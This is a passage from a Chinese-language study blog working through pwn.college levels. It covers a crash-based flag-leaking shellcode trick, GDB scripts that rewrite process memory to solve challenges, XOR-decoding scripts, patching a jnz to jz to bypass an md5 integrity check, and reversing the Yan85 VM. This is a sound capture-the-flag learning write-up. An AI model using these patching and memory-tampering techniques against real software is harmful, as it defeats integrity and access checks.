<code>SIGILL</code>, <code>-11</code> is <code>SIGSEGV</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#一点小改动</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">jnz isZero</span><br><span class="hljs-string">.ascii &quot;\x0f\x04&quot;</span><br><span class="hljs-string">isZero: .byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> p.poll(<span class="hljs-number">1</span>) == -<span class="hljs-number">4</span>:<br>    char |= mask<br></code></pre></div></td></tr></table></figure><h3 id="13-怎么是socket"><a href="#13-怎么是socket" class="headerlink" title="13.怎么是socket??"></a>13.怎么是socket??</h3><blockquote><p>use socketpair to the local communication </p><p>感觉没有任何限制啊, 就是构造一点父子进程间特有的命令.</p></blockquote><p>开始gdb refresher!!!!!</p><h1 id="module-6-gdb"><a href="#module-6-gdb" class="headerlink" title="module 6-gdb"></a>module 6-gdb</h1><p>GDB时间!</p><ul><li>info有好多东西. 看到一个<code>i proc m(appings)</code>, 不就是我上次用的<code>! cat /proc/pid/maps</code>么.</li><li> 一份超好看的<a href="https://www.cs.umd.edu/class/spring2015/cmsc414/downloads/gdb-refcard.pdf">cheatsheet</a>!</li><li>pwndbg的<a href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md">features</a> </li><li>神奇的教程网站, 视频是文字. <a href="https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Dbg1012_GDB_1+2021_v1/course/">link</a> </li><li>三种gdb插件–gef(<a href="https://demo.gef.blah.cat/">demo网站</a>|<a href="https://gef.readthedocs.io/en/master/">doc</a>), 其他两个装好了. 还是peda安装简单, 还能整到pwncollege上. 再用一个插件我会混的….</li></ul><p>“Auto-loading safe path” section in the GDB manual.</p><p>前几题都没什么特别的, 就是一个refresher.</p><p>命令行选项: <code>/challenge/e* -x gdbscrip -q</code> </p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>居然要重复四次, 直接修改推导变量. 而且没有运行前加上断点会出错….原因待查.</p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>开始编写gdb脚本. 没有尝试过的东西, 马上开学.</p><p>查看gdb manual, <code>5.1.7 Breakpoint Command Lists</code>有提到一种特别的写法:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">commands [list.<span class="hljs-string">..</span>]<br><span class="hljs-string">...</span> command-list <span class="hljs-string">...</span><br>end<br></code></pre></div></td></tr></table></figure><p>Any other command after a command that resumes execution will be ignored. </p><p>Can use <code>silent</code> to disable the printing of usual message when stopping at certain breakpoint. Usefull command for contolled output in <code>23.1.4 Commands for Controlled Output</code>, usually <code>echo, output, and printf</code> </p><p>You can also use breakpoint commands to compensate for one bug and test the other!</p><p><strong>e.g.</strong> </p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">break</span> foo <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span><br>commands<br>silent<br>printf <span class="hljs-string">&quot;x is %d\n&quot;</span>,x<br>cont<br>end<br></code></pre></div></td></tr></table></figure><p>好家伙, 每次地址都会变, 得换成相对地址. printf *($rbp-0x18)直接失败, 报attemp to dereferecing a generic pointer. 要想dereference指针得确定指针的类型, </p><p>先设断点然后再c(ontinue).</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">r                           <br>b *main+<span class="hljs-number">709</span><br>commands<br>    silent<br>    <span class="hljs-keyword">x</span>/gx $rbp<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><br>    set *(int*)($rbp<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span>)<span class="hljs-operator">=</span><span class="hljs-number">7</span><br>    <span class="hljs-keyword">c</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">c</span><br></code></pre></div></td></tr></table></figure><p>真正自己写起来问题怎么这么多……</p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><ul><li><p>全自动scrip. 在手册中的<code>23.1.3 Command Files</code>有介绍一些flow control command. 然后<code>5.1.3 Setting Catchpoints</code>也挺重要.</p></li><li><p>This time, try to write a script that doesn’t require you to ever talk to the program, and instead automatically solves each challenge by correctly <strong>modifying registers / memory.</strong> </p></li><li><p><a href="https://www.mengyibai.com/p/gdb-print-variables/">GDB: Printing Variables to File</a>, 不太好用, 毕竟是logging文件.</p></li><li><p>使用<code>printf</code>命令来写raw bytes到文件中.</p></li><li><p><code>commands</code>命令可以为断点添加命令.</p></li><li><p><code>ddb</code> – interactive kernel debugger</p></li></ul><p>如果要全自动, 我想到的思路是在read /dev/urandom的时候改成从stdin获取, 然后再gdb中使用<code>r &lt; tmp</code>来重定向. 后面的scanf也是从stdin获取, 这样的话就好办了. 为了测试conditionally perform gdb commands, 就不更改循环变量了.</p><p>历经挫折: </p><ul><li><del>把文件作为输入而且要多次输入, 每次文件指针都会向后移动的…..所以还是改变内存吧……</del>事实证明没有问题, 不过如果只是简单地&gt;=3会导致flag无法打开. 所以加上<code>4&lt;tmp</code>, if条件换成<code>if $rdi &gt;= 3 &amp;&amp; $rdi != 0x44</code>即可. </li><li>这个程序每次都会重新打开/dev/uramdom, 或许是因为新的随机数要重新打开???这样文件指针会大于等于3……</li><li>catch syscall会在syscall之前和之后调用, 所以设置好if语句就行…. (calls to and returns from system calls will be caught.)</li><li>还把==写成=, 绝</li><li>还发现了一个, 第六行按理来说已经跳到别的函数了, 毕竟read也只是glibc的封装, 但没注意到的是<code>__GI___libc_read()</code>这个函数根本没有<code>push rbp</code>,  <strong>所以当前栈帧没有变化</strong>.</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">r &lt;tmp<br>catch syscall read<br>commands<br>    silent<br>    if($rdi &gt;= 3 &amp;&amp; $rdi != 0x44)<br>        set *(int64_t*)($rbp-0x18) = 0x010203 # set ptr type<br>    end<br>    c<br>end<br><br>b *main+630 # stop at scanf()<br>commands<br>    silent<br>    set *(int64_t*)($rbp-0x10) = 0x010203<br>    c<br>end<br>c<br></code></pre></div></td></tr></table></figure><p>一个level能挣这么多东西出来…….</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>直接一个<code>call (void*)win()</code>就结束了….</p><h1 id="module-7-rev"><a href="#module-7-rev" class="headerlink" title="module 7-rev"></a>module 7-rev</h1><ul><li>forword engineering vs. reverse engineering</li><li><code>cpp du strip strings</code> commands.</li><li>the most often we do is reversing the main modules.</li><li><code>fomit-frame-pointer</code> </li><li><a href="https://cloud.binary.ninja/u/yogdzewa">cloud ninja</a> 用这个或者直接IDA就行. 都有IDA pro了其他的就随便试试.反正视频里是不可能说用盗版的:laughing: </li><li>把另一个checksec链接成了secheck, 功能似乎更多一点.</li><li>Open source:<ul><li><strong>angr management:</strong> an academic binary analysis framework! (<a href="https://github.com/angr/angr-management/releases">github</a>) </li><li><strong>ghidra:</strong> a reversing tool created by the National Security Agency (<a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a>) </li><li><strong>cutter:</strong> a reversing tool created by the radare2 open source project (<a href="https://cutter.re/">https://cutter.re/</a>) </li></ul></li><li>dynamic analysis: <ul><li>ltrace and strace </li><li>gdb<ul><li>context可以直接用display命令在每次停下来的时候模拟.</li></ul></li><li>Timeless Debugging<ul><li><strong>gdb</strong> has built-in record-replay functionality (<a href="https://sourceware.org/gdb/onlinedocs/gdb/Reverse-Execution.html#Reverse-Execution">doc</a>)</li><li><strong>rr</strong> is a highly-performant record-replay engine (<a href="https://github.com/mozilla/rr">github</a>) <a href="https://github.com/rr-debugger/rr/wiki/Usage">doc</a> </li><li><strong>qira</strong> is a timeless debugger made for reverse engineering (<a href="https://qira.me/">https://qira.me/</a>) </li></ul></li></ul></li></ul><h3 id="level1-0-2-1"><a href="#level1-0-2-1" class="headerlink" title="level1.0-2.1"></a>level1.0-2.1</h3><p>没有什么特别, 但是2.1这个字符换位置的汇编值得注意:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movzx   eax, byte ptr [rbp+buf]<br>mov     byte ptr [rbp+var_10], al<br>movzx   eax, byte ptr [rbp+buf+1]<br>mov     byte ptr [rbp+var_10+1], al<br>movzx   eax, byte ptr [rbp+var_10+1]<br>mov     byte ptr [rbp+buf], al<br>movzx   eax, byte ptr [rbp+var_10]<br>mov     byte ptr [rbp+buf+1], al<br></code></pre></div></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>合着每关还有提示这关用了什么……</p><p>level3是reverse mangler.</p><h3 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h3><ul><li>IDA的汇编语法是使用的MASM(Microsoft Macro Assembler)的. <a href="https://docs.microsoft.com/en-us/cpp/assembler/masm/directives-reference?view=msvc-170">这里</a>是一些directive. </li><li>IDA使用的high-level IL是IDC, 一个C-like language. 像什么<code>LOBYTE</code>在手册中有</li><li>一个<code>char buf[6]</code>被识别成了<code>int buf + int16_t v6</code>, 改一下buf的定义就成.</li><li>看了看IDA的一些操作.</li></ul><p>由于<code>biltw</code>是按照字母顺序排列, 所以一通操作之后没有变化.</p><h3 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h3><blockquote><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xb2</code> </p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">0xFA</span>,<span class="hljs-number">0xF6</span>,<span class="hljs-number">0xEA</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xF1</span>]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">chr</span>(x^<span class="hljs-number">0x98</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>])<br><br>[<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>]<br></code></pre></div></td></tr></table></figure><p>好像简单过头了…</p><h3 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h3><blockquote><p>reverse + sort + xor</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;8f 8e 8e 8e 8c 82 81 87 86 84 9f 9e 9e 9e 93&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br>list1 = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>)^<span class="hljs-number">0xeb</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br>list1.reverse()<br>res = <span class="hljs-string">&quot;&quot;</span>.join([x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list1])<br><span class="hljs-built_in">print</span>(res)<br></code></pre></div></td></tr></table></figure><p>属于是python的练习使用</p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><blockquote><p>真特么复杂….还有<strong>不可见字符</strong>只能整成byte写到文件里.</p><p>好像挺简单, 但是又有点难(?</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;ff ff fe fc fb fb fb f7 f6 f6 f1 e7 e6 e1 e1 3c 3a 3a 38 37 32 32 20 2c 25 22 21 32 20&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>] = <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>]<br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment">#print(len(list))</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">27</span>,<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">list</span>[i] ^= <span class="hljs-number">0x95</span><br>    <span class="hljs-built_in">list</span>[i+<span class="hljs-number">1</span>] ^= <span class="hljs-number">0x56</span><br><span class="hljs-built_in">list</span>[<span class="hljs-number">28</span>] ^= <span class="hljs-number">0x95</span> <span class="hljs-comment">#奇数个.....</span><br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><br><br>byte = <span class="hljs-string">b&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]) <span class="hljs-comment">#什么需求直接谷歌比看文档快多了, 特别是这种简单语法......</span><br><span class="hljs-built_in">print</span>(byte)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/root/Desktop/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(byte)                                                                              <br></code></pre></div></td></tr></table></figure><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>这合理吗? 就硬堆数量……</p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><blockquote><p>噢, 有点东西, 完全看不出来发生了什么, 得反汇编看看.</p><p>用的md5, 没有办法reverse, 但是可以修改代码内容. </p></blockquote><ul><li>IDA 添加类型 在shift+f1的local types中添加. 也就是view中的open subviews. ctrl+1=quick view</li><li>gdb 与 set-uid 程序 与 $base</li><li>IDA number of operand.</li></ul><p>因为使用了<code>mprotect()</code>可以修改代码段, 所以直接找到jnz的地方改成jz. 也就是0x1f01处从75改成74.</p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>使用bin_pedding函数把main函数填充到了2xxx的相对地址处, 不过同上.</p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><blockquote><p>IDA的rename选项在手册的Give Name to the Location章, 查了下LOCAL and PUBLIC伪指令</p><p>我还得查下md5函数怎么用.</p></blockquote><p>直接把整个程序的每个部分进行一个hash, 所以修改其他地方无法通过验证. 而且只能修改2byte.</p><p>没事了, 连着改两个jnz就行了.</p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><blockquote><p>开始Yan85</p></blockquote><ul><li>LOAD segment 只是个没有名字的段, IDA默认整个名字上去. 可以在段介绍中看到pure data/code之类的.</li><li>递归学习:<ul><li>在IDA看到一个<code>text &quot;UTF-16LE&quot;, &#39;abcdsif&#39;</code>, 还以为七个字符是连在一起的. 结果发现UTF-16LE有特别的地方. 直接改成DATA就会出现\0间隔的字符.</li><li>然后就去查16LE是什么. 其实就是UTF-16的little-endian版本. Byte-Order-Mark etc.</li><li><strong>UTF-8优势在于ascii是1byte, 16优势在于非ascii是两字节, 32在于不用encoding and decoding</strong>.</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm"># memset的一种实现方法, store string from rax by addr in rdi and counter in rcx.<br>leardx，[rbp+var_110]<br>moveax， 0<br>movecx，20h ;<br>mov rdi,rdx<br>rep stosq<br></code></pre></div></td></tr></table></figure><hr><p>Yan85: a1, a2, a3是arg no.</p><ul><li><p>在main函数中一个256字节的空间(char a1[256+7]), 后面跟着7byte用作七个寄存器的空间. 然后进入execute_program.</p></li><li><p>describe_register是将数字转换成一个字符, 总共有七个, 每个字符后面都有\0: <code>aNone           db &#39;NONE&#39;,0</code> </p></li><li><p>describe_* 后面的level可能会用到, 到时再说</p></li><li><p>write_register是将a2用作a1[256~262]的索引, 然后将a3写入数组中.</p><p><strong>寄存器 <code>r1 r2 r3 r4 r5 r6 r7</code></strong>  </p><p>**分别是 <code>8  4  64 32 16 2  1 </code> ** </p></li><li><p>write_memory被用在stm指令中</p></li></ul><p>然后分析<strong>每个指令</strong>作用: (reg)表示标号对应的寄存器的值.</p><ul><li>imm 就是     <code>(reg)a2 = a3</code> 加载立即数.</li><li>stm其实就是<code>mov [(reg)a2 + a1], a3</code> </li><li>syscall(a1, a2, a3), 假设寄存器为<strong>r1 r2 ~ r6</strong>, 然后<strong>if a2 == …</strong> <ul><li>8: open <code>fd = open(&amp;a1[r1], r2, r3); (reg)a3 = fd;</code> </li><li>4: read <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = read(r1, &amp;a1[r2], v5)</code> 然后count写入reg a3</li><li>1: write <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = write(r1, &amp;a1[r2], v5)</code> 然后count写入reg a3</li><li>16: sleep r1 secs, (reg)a3 = left_time</li><li>0x20: <code>exit(r1)</code> </li><li>else:  <code>exit( (reg)a3 )</code> </li></ul></li></ul><p>如果是12.1, 估计我写个gdb脚本会更方便我查看执行流程. 在每个函数入口处dumpargs, 然后打印出来. 12.0我就直接看看提示.</p><p>woc, 12.1都没有函数名称的, 我还得重命名一下函数. </p><p>看了前面的一点, 只要<code>printf &quot;\x94\x11\x3f\xb3&quot; &gt; input</code> 就行. 自动读取flag.</p><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><blockquote><ul><li>ldm: load from memory: <code>(reg)a2 = a1[(reg)a3]</code> </li><li>cmp: 两个寄存器结果放在a1[262]里, 第五位作为标志位, <figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">小于 : 16  第5位<br>大于 : 8第4位<br>等于 : 4 第3位<br>不等于: <span class="hljs-number">2</span>      第<span class="hljs-number">2</span>位<br>两个全为零:<span class="hljs-number">1</span>   第<span class="hljs-number">1</span>位<br></code></pre></div></td></tr></table></figure></li><li><strong>寄存器 <code>r1 r2 r3 r4 r5 r6 r7</code></strong><br>**分别是 <code>16 64 1  4  8  32 2 </code> ** </li></ul></blockquote><p>看视频看到了新方法.</p><ul><li>遇到了一个指令解析错误, 只能undefine<code>crash</code>函数, 然后把字节设置成指令 设置函数end 设置新函数.</li><li>完全可以只用静态分析, 既然256字节空间之后跟着的是7个register, 那么可以定义一个结构体, 这样decompilerd result会更准确.</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> memory[<span class="hljs-number">256</span>];<br>  <span class="hljs-keyword">unsigned</span> __int8 r1;<br>  <span class="hljs-keyword">unsigned</span> __int8 r2;<br>  <span class="hljs-keyword">unsigned</span> __int8 r3;<br>  <span class="hljs-keyword">unsigned</span> __int8 r4;<br>  <span class="hljs-keyword">unsigned</span> __int8 r5;<br>  <span class="hljs-keyword">unsigned</span> __int8 r6;<br>  <span class="hljs-keyword">unsigned</span> __int8 r7;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>对于describe_register()函数来说可以定义一个enum变量, 就不用搁那翻译每个寄存器是对应哪个数字了.</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">REGISTER</span> :</span> __int8<br>&#123;<br>  r1 = <span class="hljs-number">0x1</span>,<br>  r3 = <span class="hljs-number">0x2</span>,<br>  r7 = <span class="hljs-number">0x4</span>,<br>  r4 = <span class="hljs-number">0x8</span>,<br>  r2 = <span class="hljs-number">0x10</span>,<br>  r6 = <span class="hljs-number">0x20</span>,<br>  r5 = <span class="hljs-number">0x40</span>,<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h3><blockquote><p>emmmmm好像也没什么意义, 纯粹花时间看懂一个流程罢了. 只是复杂度的简单叠加, 把输入的每个bit进行一个加法操作.</p></blockquote><p>这题是0x81位置上先放九个数, 然后再分别加上一个数字, 然后, 就那样..</p><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>还是加上一个数, 勉强做一下. 果然是浪费时间.</p><h3 id="level16-1"><a href="#level16-1" class="headerlink" title="level16.1"></a>level16.1</h3><blockquote><p>开始Yan85 byte code. 直接从没有符号的版本入手开始占卜(</p></blockquote><p><del>IDA反编译出了问题, 实在是逆转前三个字节顺序的汇编代码太神奇, 一堆符号拓展 零拓展什么的.</del> 然后发现并没有问题.</p><p>发现指令编码是这样一个结构:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inst</span></span><br><span class="hljs-class">&#123;</span><br>  __int8 oprnd_1;<br>  __int8 opcode;<br>  __int8 oprnd_2;<br>  __int8 pedding; <span class="hljs-comment">//useless</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>在IDA中使用IDC编写脚本(gdb script也行, 也可以设置临时变量之类的).</p><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = SIL;<br><span class="hljs-keyword">auto</span> reg2 = (ESI &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br>msg(<span class="hljs-string">&quot;\tADD: %s = %s + %s\n&quot;</span>, s1, s1, s2);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="POP"><a href="#POP" class="headerlink" title="POP:"></a>POP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>);<br><span 